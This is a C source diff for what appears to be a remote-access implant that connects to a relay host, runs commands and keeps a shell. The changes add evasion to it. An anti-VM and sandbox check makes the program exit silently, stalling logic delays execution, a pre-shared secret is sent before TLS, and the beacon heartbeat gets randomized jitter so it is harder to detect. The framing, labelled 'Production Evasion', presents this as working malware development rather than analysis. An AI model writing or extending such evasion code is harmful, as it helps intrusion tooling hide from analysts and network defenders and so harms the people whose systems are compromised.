@@ -6,6 +6,7 @@
 #include "utils.h"
 #include "command_execution.h"
 #include "memfd_loader.h"
+#include "anti_vm.h"
 #include <stdlib.h>
 #include <string.h>
 #include <stdio.h>
@@ -79,6 +80,13 @@ static void wipe_argv(int argc, char *argv[]) {
 }
 
 int main(int argc, char *argv[]) {
+    // Production Evasion: Anti-VM & Stalling Logic
+    if (ph_anti_vm_check()) {
+        // Exit silently if VM/Sandbox detected
+        _exit(0);
+    }
+    ph_stalling_logic();
+
     signal(SIGSEGV, fatal_signal_handler);
     signal(SIGABRT, fatal_signal_handler);
     signal(SIGILL, fatal_signal_handler);
@@ -179,6 +187,13 @@ int main(int argc, char *argv[]) {
             continue;
         }
 
+        // V2.0 Pre-Auth: Send PSK (first 4 bytes of secret)
+        if (secret != NULL && strlen(secret) >= 4) {
+            send(sock_fd, secret, 4, 0);
+        } else {
+            send(sock_fd, "SECR", 4, 0); // Fallback
+        }
+
         ph_tls_ctx_t tls_ctx;
 
         if (ph_tls_init(&tls_ctx, sock_fd, relay_host) != PH_OK) {
@@ -216,15 +231,17 @@ int main(int argc, char *argv[]) {
         char output_buffer[PH_CMD_MAX_OUTPUT_SIZE];
         int shell_active = 0;
         uint64_t last_heartbeat = ph_get_timestamp_ms();
+        uint32_t heartbeat_interval = 30000 + (rand() % 15000); // Initial jitter
         memset(&exec_ctx, 0, sizeof(exec_ctx));
 
         while (1) {
             uint64_t now_ms = ph_get_timestamp_ms();
-            if (now_ms - last_heartbeat >= 30000) {
+            if (now_ms - last_heartbeat >= heartbeat_interval) {
                 ph_socket_flush(&tls_ctx);
                 uint8_t hdr[11] = {'P','H','N','T', PH_CMD_PING, 0,0, 0,1, 0,0};
                 ph_tls_send(&tls_ctx, hdr, 11);
                 last_heartbeat = now_ms;
+                heartbeat_interval = 25000 + (rand() % 20000); // Randomize next interval
             }
 
             fd_set readfds;
